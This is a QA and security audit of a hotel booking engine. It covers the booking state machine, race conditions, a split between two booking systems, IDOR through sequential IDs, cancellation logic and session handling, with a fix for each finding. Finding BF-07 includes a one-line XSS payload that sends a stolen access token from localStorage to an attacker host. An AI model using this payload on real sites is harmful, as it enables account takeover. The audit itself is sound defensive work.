# Hotel Booking Engine — Booking Flow & State Machine QA Audit

**Audited:** 2026-05-13  
**Branch:** main  
**Scope:** Booking flow, state machine, validation, cancellation, session handling, email, security

---

## Summary Table

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 6 |
| Medium | 8 |
| Low | 5 |

---

## Architecture Note: Dual Booking System

Before the per-issue findings, one structural observation that cuts across the entire audit:

The site operates **two completely separate booking systems** that share no data:

1. **Local custom API** — `BookingForm.tsx` → `POST /bookings` → local PostgreSQL → admin dashboard at `/admin/bookings`
2. **Stayflexi external engine** — `/bookings` and `/bookings/[id]` pages both do `window.location.href = bookingEngineUrl` (Stayflexi)

A guest clicking the main "Bookings" nav link lands in Stayflexi. A guest clicking "Book Now" on a room detail page lands in the local `BookingForm`. Stayflexi bookings are invisible to the local admin dashboard. Local bookings are invisible to Stayflexi. Neither system conflict-checks the other. See **BF-03** for full impact.

---

## Critical

---

### BF-01 — Mock API silently active on misconfigured deployment — every booking silently discarded

**[SEVERITY: critical]** | [frontend/lib/api.ts](frontend/lib/api.ts#L6-L7)

**Bug/Risk:**  
`USE_MOCK_API` defaults to `true` whenever `NEXT_PUBLIC_API_URL` is unset:

```ts
const USE_MOCK_API = process.env.NEXT_PUBLIC_USE_MOCK_API === 'true' ||
  (process.env.NEXT_PUBLIC_USE_MOCK_API !== 'false' && !process.env.NEXT_PUBLIC_API_URL);
```

The mock availability handler always returns `{ available: true }` regardless of dates (line 215). The mock booking handler appends to an in-memory `mockBookings[]` array (line 245) — lost on page refresh. A guest on a misconfigured production deployment will complete the entire booking flow — see a booking ID, get redirected — but no booking is ever written to the database. There is no warning, no error, and no visual indication that mock mode is active.

**Recommended Fix:**  
Invert the default. Mock mode should require an explicit opt-in, not opt-out:

```ts
const USE_MOCK_API = process.env.NEXT_PUBLIC_USE_MOCK_API === 'true';
```

Add a loud startup warning or throw if `NODE_ENV === 'production'` and `NEXT_PUBLIC_API_URL` is missing.

---

### BF-02 — No inventory hold between availability check and booking submission (frontend TOCTOU)

**[SEVERITY: critical]** | [frontend/components/booking/BookingForm.tsx](frontend/components/booking/BookingForm.tsx#L119-L141)

**Bug/Risk:**  
The `onSubmit` handler makes two sequential, non-atomic API calls:

```ts
// Step 1 — availability check
const availabilityResponse = await api.get(`/rooms/${room.id}/availability`, ...);

// Step 2 — create booking (separate round-trip, no lock held)
const response = await api.post('/bookings', bookingData);
```

Between these two calls, another user can book the last room. The backend also has no atomic lock (see C-02 in `AVAILABILITY_AUDIT.md`). The two-step frontend pattern compounds the server-side race: even if the backend were fixed with `SELECT FOR UPDATE`, having the frontend do a pre-check followed by a separate POST is still wasteful and misleading to the user.

**Recommended Fix:**  
Remove the frontend pre-check entirely. The backend `POST /bookings` already checks availability. The pre-check only adds a race window and an extra round-trip. Trust the backend 409 conflict response and surface it to the user.

---

### BF-03 — Dual booking system creates inventory blind spots — double-booking across systems

**[SEVERITY: critical]** | [frontend/app/bookings/page.tsx](frontend/app/bookings/page.tsx#L10-L11) + [frontend/lib/booking-engine.ts](frontend/lib/booking-engine.ts#L2) + [frontend/components/booking/BookingForm.tsx](frontend/components/booking/BookingForm.tsx)

**Bug/Risk:**  
`/bookings` and `/bookings/[id]` redirect to `https://bookingengine.stayflexi.com/?hotel_id=33297`. Room detail pages use the local `BookingForm` that writes to the local database. These two systems have no shared inventory:

- A guest books Room 101 via Stayflexi for 15–17 May.
- Another guest searches via the local room page — the local availability check queries the local `bookings` table, finds no conflict, and allows booking Room 101 for 15–17 May.
- Both bookings succeed. The same room is double-booked.

Additionally, `BookingDetailPage` (`/bookings/[id]`) ignores the booking `id` param entirely and just redirects to Stayflexi, so guests who book through the local API can never view their confirmation through the site's booking flow.

**Recommended Fix:**  
Choose one canonical booking system. Either: (a) route all bookings through Stayflexi and remove the local `BookingForm` API calls, or (b) remove the Stayflexi redirect and complete the local booking confirmation page. The current hybrid state is not safe for a live property.

---

## High

---

### BF-04 — No confirmation email exists despite SMTP config

**[SEVERITY: high]** | [backend/app/api/v1/bookings.py](backend/app/api/v1/bookings.py#L98-L102) + [backend/app/core/config.py](backend/app/core/config.py#L18-L23)

**Bug/Risk:**  
The config has `SMTP_HOST`, `SMTP_PORT`, `SMTP_USER`, `SMTP_PASSWORD`, and `FROM_EMAIL` fields, strongly suggesting email was planned. There is no email sending code anywhere in the codebase — no service class, no background task, no template. `create_booking` commits the booking and returns with no email side-effect. Guests receive no confirmation, no booking reference, and no receipt.

The idempotency question ("confirmation sent only once even on retry") is not applicable — the bigger issue is that it is never sent at all.

**Recommended Fix:**  
Implement a `send_booking_confirmation()` utility using `fastapi-mail` or `smtplib`. Call it after `db.commit()` inside `create_booking`. To ensure idempotency, add a `confirmation_email_sent: bool` flag on the `Booking` model and check it before sending.

---

### BF-05 — Sequential integer booking IDs are enumerable (IDOR)

**[SEVERITY: high]** | [backend/app/models/booking.py](backend/app/models/booking.py#L22) + [backend/app/api/v1/bookings.py](backend/app/api/v1/bookings.py#L118)

**Bug/Risk:**  
`id = Column(Integer, primary_key=True, index=True)` — booking IDs are sequential integers (1, 2, 3…). `GET /bookings/3` returns booking #3. Although there is an ownership check:

```python
if booking.user_id != current_user.id and current_user.role.value != "admin":
    raise HTTPException(status_code=403, ...)
```

The response leaks the *existence* of a booking at that ID (404 vs 403), and the admin panel URL pattern `admin/bookings/3` exposes the total booking count. Sequential IDs are also a common target for automated scraping of PII (guest names, emails, phone numbers) if the auth check ever regresses.

**Recommended Fix:**  
Add a non-sequential public booking reference. Options:

```python
# Option A: UUID
booking_ref = Column(String, default=lambda: str(uuid.uuid4()), unique=True, index=True)

# Option B: Human-readable
booking_ref = Column(String, default=lambda: f"SHIV-{secrets.token_hex(4).upper()}", unique=True)
```

Use `booking_ref` in all guest-facing URLs and emails. Keep the integer primary key for internal joins only.

---

### BF-06 — Booking for today submits midnight timestamp — always rejected by backend past 00:00

**[SEVERITY: high]** | [frontend/components/booking/BookingForm.tsx](frontend/components/booking/BookingForm.tsx#L106-L117) + [backend/app/api/v1/bookings.py](backend/app/api/v1/bookings.py#L27)

**Bug/Risk:**  
The `<input type="date">` collects only a date string (e.g., `"2026-05-13"`). The `formatDateForBackend` function appends `T00:00:00`:

```ts
return `${dateString}T00:00:00`;  // → "2026-05-13T00:00:00"
```

The backend rejects any `check_in_date` earlier than the current server time:

```python
if booking_data.check_in_date < datetime.now(booking_data.check_in_date.tzinfo):
```

After midnight on any given day, today's date at `T00:00:00` is always in the past. **A guest attempting same-day check-in (e.g., checking in at 14:00 today) will receive "Check-in date cannot be in the past"** because `2026-05-13T00:00:00 < 2026-05-13T09:35:00`. The `min={today}` attribute on the date input does not help since it only prevents selecting past calendar days, not midnight vs now.

**Recommended Fix:**  
For same-day bookings, use the hotel's actual check-in time, not midnight:

```ts
const formatDateForBackend = (dateString: string, isCheckIn: boolean): string => {
  if (dateString.includes('T')) return dateString;
  const time = isCheckIn ? 'T14:00:00' : 'T11:00:00'; // Hotel check-in/out times
  return `${dateString}${time}`;
};
```

Or change the backend validation to compare only the date component, not the full datetime.

---

### BF-07 — Auth tokens in localStorage — vulnerable to XSS exfiltration

**[SEVERITY: high]** | [frontend/lib/api.ts](frontend/lib/api.ts#L308-L311) + [frontend/lib/store.ts](frontend/lib/store.ts#L15-L17)

**Bug/Risk:**  
Access and refresh tokens are stored in `localStorage`:

```ts
localStorage.setItem('access_token', access_token);
localStorage.setItem('refresh_token', refresh_token);
```

Any XSS payload injected into the page (via guest name, special requests rendered without sanitization, or a compromised third-party script) can read and exfiltrate both tokens:

```js
// XSS payload
fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'))
```

The refresh token is long-lived (7 days) making this high-impact.

**Recommended Fix:**  
Use `httpOnly` cookies instead of localStorage. Set `Secure`, `SameSite=Strict` and configure CORS to `credentials: 'include'`. The frontend should not be able to read the token — the browser sends it automatically on every request.

---

### BF-08 — Session expiry mid-booking loses all form data

**[SEVERITY: high]** | [frontend/lib/api.ts](frontend/lib/api.ts#L327-L348) + [backend/app/core/config.py](backend/app/core/config.py#L9)

**Bug/Risk:**  
The access token expires after 30 minutes (`ACCESS_TOKEN_EXPIRE_MINUTES: int = 30`). If both the access and refresh tokens are expired when the user submits the `BookingForm`, the response interceptor:

1. Tries to refresh → fails (refresh token expired after 7 days, or same-session issue)
2. Clears tokens from localStorage
3. Calls `window.location.href = '/login'`

The user is navigated away from the booking page. All `useForm` state — dates, guest name, email, phone, special requests — is destroyed. The user must start over from scratch.

**Recommended Fix:**  
Before redirecting to login, serialize the form state to `sessionStorage`. After successful login, redirect back to the booking page and restore state from `sessionStorage`. Alternatively, use a guest checkout flow that doesn't require a token at all for the initial booking creation.

---

## Medium

---

### BF-09 — No `NO_SHOW` state in booking state machine

**[SEVERITY: medium]** | [backend/app/models/booking.py](backend/app/models/booking.py#L7-L12)

**Bug/Risk:**  
The current states are `PENDING`, `CONFIRMED`, `CHECKED_IN`, `CHECKED_OUT`, `CANCELLED`. There is no `NO_SHOW` state. A guest who does not arrive and does not cancel cannot be marked distinctly from a guest who cancelled in advance. No-shows typically have different revenue treatment (charge vs. refund) and are required for accurate occupancy reporting. The admin can only set `CANCELLED`, which conflates the two cases.

**Recommended Fix:**  
Add `NO_SHOW = "no_show"` to `BookingStatus`. Allow the transition `CONFIRMED → NO_SHOW`. Apply a different refund/charge rule for no-shows.

---

### BF-10 — Admin UI allows all state transitions including illegal ones

**[SEVERITY: medium]** | [frontend/app/admin/bookings/[id]/page.tsx](frontend/app/admin/bookings/%5Bid%5D/page.tsx#L274-L302) + [backend/app/api/v1/admin.py](backend/app/api/v1/admin.py#L69-L70)

**Bug/Risk:**  
The "Manage Status" panel renders four action buttons — Confirm, Check In, Check Out, Cancel — and disables only the button matching the *current* state. This means:

- A `CHECKED_OUT` booking can be "Confirmed" again
- A `PENDING` booking can be jumped directly to "Check Out"
- A `CANCELLED` booking can be "Confirmed" or "Checked In"

The backend applies the transition without validation. The state machine has no transition graph.

**Recommended Fix:**  
Define allowed transitions server-side and enforce them in `update_booking_admin`. Client-side, derive which buttons are enabled from the transition map rather than "not current state":

```python
VALID_TRANSITIONS = {
    BookingStatus.PENDING: {BookingStatus.CONFIRMED, BookingStatus.CANCELLED},
    BookingStatus.CONFIRMED: {BookingStatus.CHECKED_IN, BookingStatus.CANCELLED, BookingStatus.NO_SHOW},
    BookingStatus.CHECKED_IN: {BookingStatus.CHECKED_OUT},
    BookingStatus.CHECKED_OUT: set(),
    BookingStatus.CANCELLED: set(),
    BookingStatus.NO_SHOW: set(),
}
```

---

### BF-11 — Cancellation policy is display-only — never programmatically enforced

**[SEVERITY: medium]** | [frontend/components/booking/BookingForm.tsx](frontend/components/booking/BookingForm.tsx#L417-L420) + [backend/app/api/v1/bookings.py](backend/app/api/v1/bookings.py#L156-L171)

**Bug/Risk:**  
The `BookingForm` renders `hotelContent.policies.cancellation.description` as a text block. The cancellation window is communicated to the guest in prose. However:

- `DELETE /bookings/{id}` sets `status = CANCELLED` unconditionally regardless of when the cancellation occurs
- No cancellation window is calculated
- No refund decision is made or recorded
- No `cancelled_at` timestamp is stored
- A guest cancelling 5 minutes before check-in gets the same API response as a guest cancelling 30 days ahead

This is both a financial risk (refunds that shouldn't be granted) and a compliance/dispute risk.

**Recommended Fix:**  
Add `cancellation_policy_type` (e.g., `free_cancellation_hours: int`) to `RoomType`. On `DELETE /bookings/{id}`, compute whether the cancellation is within the free window and set `payment_status` accordingly:

```python
hours_until_checkin = (booking.check_in_date - datetime.now(tz=timezone.utc)).total_seconds() / 3600
if hours_until_checkin < room_type.free_cancellation_hours:
    booking.payment_status = PaymentStatus.PENDING  # Non-refundable; manual review
else:
    booking.payment_status = PaymentStatus.REFUNDED
```

---

### BF-12 — Cancelling an already-cancelled booking is silently idempotent with no error

**[SEVERITY: medium]** | [backend/app/api/v1/bookings.py](backend/app/api/v1/bookings.py#L156-L171)

**Bug/Risk:**  
`DELETE /bookings/{id}` sets `status = BookingStatus.CANCELLED` and returns `204` regardless of current status. If a booking is already `CANCELLED`, the operation succeeds silently. If the cancellation policy is enforced in the future (BF-11), this becomes a vector to trigger refund-processing logic multiple times.

**Recommended Fix:**  
Check current status before proceeding:

```python
if booking.status == BookingStatus.CANCELLED:
    raise HTTPException(status_code=409, detail="Booking is already cancelled")
if booking.status in (BookingStatus.CHECKED_IN, BookingStatus.CHECKED_OUT):
    raise HTTPException(status_code=409, detail="Cannot cancel a booking in progress or completed")
```

---

### BF-13 — No booking modification endpoint — dates and room cannot be changed

**[SEVERITY: medium]** | [backend/app/schemas/booking.py](backend/app/schemas/booking.py#L21-L24) + [backend/app/api/v1/bookings.py](backend/app/api/v1/bookings.py#L128-L154)

**Bug/Risk:**  
`BookingUpdate` only allows changing `status`, `payment_status`, and `special_requests`. There is no way to modify `check_in_date`, `check_out_date`, `room_id`, or `number_of_guests` after creation. Guests and admins who need to extend a stay, switch rooms, or correct a date must cancel and rebook — losing their original booking reference and, once emails are implemented, triggering a cancellation email followed by a new booking email.

**Recommended Fix:**  
Add a `PATCH /bookings/{id}/modify` endpoint (admin-only or with modification window) that accepts new dates and performs an availability re-check before committing changes. Log the old values in a `BookingModificationHistory` table.

---

### BF-14 — Child age range labelled "0-12 years" but age is never collected or validated

**[SEVERITY: medium]** | [frontend/components/booking/BookingForm.tsx](frontend/components/booking/BookingForm.tsx#L257-L258)

**Bug/Risk:**  
The form label says "Children (0-12 years)" but only collects a count, not ages. The boundary cases — age 0 (infant), age 12 vs 13 boundary, age 17 vs 18 (adult vs child) — are never validated. The pricing code applies `child_price` uniformly to any `number_of_children` value without verifying their ages. A 17-year-old can be submitted as a child for reduced pricing; a 6-month-old infant would be priced the same as a 12-year-old child.

**Recommended Fix:**  
Either collect ages and validate against the policy boundaries, or split the count into separate fields (`number_of_infants: 0–2yrs`, `number_of_children: 3–12yrs`, `number_of_teens: 13–17yrs`) with separate pricing tiers. If the hotel policy is truly age-agnostic, remove the "(0-12 years)" label to avoid misleading guests.

---

### BF-15 — `special_requests` field has no length limit — potential for oversized payloads

**[SEVERITY: medium]** | [backend/app/schemas/booking.py](backend/app/schemas/booking.py#L16) + [backend/app/models/booking.py](backend/app/models/booking.py#L36)

**Bug/Risk:**  
`special_requests: Optional[str] = None` has no `max_length` constraint in the Pydantic schema. The database column is `Column(Text)` — unbounded. A client can submit a multi-megabyte string in this field. With no server-side limit, this will:
- Bloat the database row
- Slow down admin list pages that render the full text
- Potentially trigger memory issues in email templating when confirmation emails are implemented

**Recommended Fix:**

```python
special_requests: Optional[str] = Field(default=None, max_length=2000)
```

Add a `CHECK` constraint or column length limit at the database level as a second layer.

---

### BF-16 — Duplicate submission window exists despite button `disabled` state

**[SEVERITY: medium]** | [frontend/components/booking/BookingForm.tsx](frontend/components/booking/BookingForm.tsx#L108-L160)

**Bug/Risk:**  
The submit button is disabled via `disabled={loading}` only after `setLoading(true)` is called inside `onSubmit`. Between the user's click event and React's re-render applying the disabled state, a second rapid click (or the browser submitting on Enter key) can fire a second `onSubmit` call. Both calls proceed through the two-step availability check + booking creation. The backend has no idempotency key to deduplicate.

**Recommended Fix:**  
Use a `useRef` guard that is set synchronously before any async work:

```ts
const submittingRef = useRef(false);
const onSubmit = async (data: BookingFormData) => {
  if (submittingRef.current) return;
  submittingRef.current = true;
  // ... async work ...
  submittingRef.current = false;
};
```

Also implement idempotency on the backend via a client-generated `X-Idempotency-Key` header stored in the `Booking` model.

---

## Low

---

### BF-17 — Booking ID `#1`, `#2`, `#3` exposed in admin UI — total booking count visible

**[SEVERITY: low]** | [frontend/app/admin/bookings/[id]/page.tsx](frontend/app/admin/bookings/%5Bid%5D/page.tsx#L136)

**Bug/Risk:**  
`<h1>Booking #{booking.id}</h1>` displays the sequential integer ID. Any person with admin access (or who observes the URL) can infer the property's total booking volume. This is minor for a single-property admin but is relevant for competitive sensitivity.

**Recommended Fix:**  
Display the `booking_ref` field (once added per BF-05) instead of the internal integer ID. Keep the integer ID as an internal identifier only.

---

### BF-18 — Date/time display in admin uses browser local timezone, not hotel's IST timezone

**[SEVERITY: low]** | [frontend/app/admin/bookings/[id]/page.tsx](frontend/app/admin/bookings/%5Bid%5D/page.tsx#L182-L186)

**Bug/Risk:**  
`format(checkInDate, 'EEEE, MMMM d, yyyy')` and `format(checkInDate, 'h:mm a')` (from `date-fns`) use the browser's local timezone. Dates stored as `2026-05-15T00:00:00` (naive, local) will display differently for an admin in UTC vs IST (UTC+5:30). A check-in on the 15th stored as midnight IST would display as the 14th in UTC.

**Recommended Fix:**  
Use `date-fns-tz` to explicitly format in the hotel's timezone:

```ts
import { formatInTimeZone } from 'date-fns-tz';
formatInTimeZone(checkInDate, 'Asia/Kolkata', 'EEEE, MMMM d, yyyy');
```

---

### BF-19 — Phone number stored as raw string with no normalization

**[SEVERITY: low]** | [frontend/components/booking/BookingForm.tsx](frontend/components/booking/BookingForm.tsx#L22) + [backend/app/models/booking.py](backend/app/models/booking.py#L35)

**Bug/Risk:**  
`guest_phone: z.string().optional()` — no regex, no normalization. The same guest could submit `9876543210`, `+91 9876543210`, `+91-987-654-3210`, or `09876543210`. These are stored as-is and would be treated as four distinct phone numbers in any analytics, deduplication, or SMS notification system built later.

**Recommended Fix:**  
Normalize on the backend using a library like `phonenumbers`:

```python
import phonenumbers
parsed = phonenumbers.parse(guest_phone, "IN")  # Default region
normalized = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
```

---

### BF-20 — `GET /bookings/{id}` leaks booking existence via 403 vs 404 distinction

**[SEVERITY: low]** | [backend/app/api/v1/bookings.py](backend/app/api/v1/bookings.py#L118-L124)

**Bug/Risk:**  
```python
booking = db.query(Booking).filter(Booking.id == booking_id).first()
if not booking:
    raise HTTPException(status_code=404, detail="Booking not found")   # non-existent
if booking.user_id != current_user.id and ...:
    raise HTTPException(status_code=403, detail="Not authorized")       # exists but forbidden
```

The 404/403 distinction tells an authenticated attacker which booking IDs exist. They can enumerate: 404 = no booking at this ID, 403 = booking exists but belongs to someone else.

**Recommended Fix:**  
Return 404 in both cases for non-admin users:

```python
if not booking or (booking.user_id != current_user.id and current_user.role.value != "admin"):
    raise HTTPException(status_code=404, detail="Booking not found")
```

---

## Checklist Coverage

| Checklist Item | Status | Finding |
|---|---|---|
| Back navigation after payment — inventory held? | N/A | No payment page exists; booking is created immediately on submit; see BF-01/BF-02 |
| Session expiry mid-booking | Missing | Form state lost on token expiry + redirect to login (BF-08) |
| Duplicate submission | Partial | Button disabled after render but ref guard missing; no backend idempotency key (BF-16) |
| Browser refresh on confirmation page | N/A | `/bookings/[id]` redirects to Stayflexi; no local confirmation page |
| Special characters in guest name | Accepted | `z.string().min(2)` + `String` column accepts Unicode correctly |
| Email subaddressing `user+tag@domain` | Accepted | Zod `.email()` and Pydantic `EmailStr` both accept RFC-compliant subaddresses |
| Phone number formats | Missing | No normalization or format validation (BF-19) |
| Child age fields — age 0, 17, 18 boundary | Missing | No age fields collected at all; only count (BF-14) |
| Same-day booking cut-off | Broken | Midnight timestamp always rejected past 00:00 (BF-06) |
| Group bookings (10+ rooms) | Missing | No multi-room booking concept; max 10 guests per booking via Zod schema |
| Property timezone vs server timezone | Partial | Admin display uses browser timezone, not hotel's IST (BF-18) |
| All booking states listed | Partial | Missing `NO_SHOW`; no `MODIFIED` state (BF-09) |
| Invalid state transitions blocked | Missing | No transition graph server-side or client-side (BF-10) |
| Booking reference unique and collision-resistant | Missing | Sequential integer ID; no UUID/token reference (BF-05) |
| Confirmation email idempotent | N/A | No email service exists at all (BF-04) |
| Hold duration between search and payment | Missing | No hold mechanism; booking created immediately as PENDING; see AVAILABILITY_AUDIT C-01 |
| Cancel within free-cancellation window — refund triggered | Missing | Policy text-only; no programmatic enforcement (BF-11) |
| Cancel after non-refundable window — policy communicated | Partial | Text displayed; not enforced; no refund decision made (BF-11) |
| Partial cancellation (multi-room) | N/A | Multi-room booking not supported |
| Cancel already-cancelled booking | Missing | Returns 204 silently; no error (BF-12) |
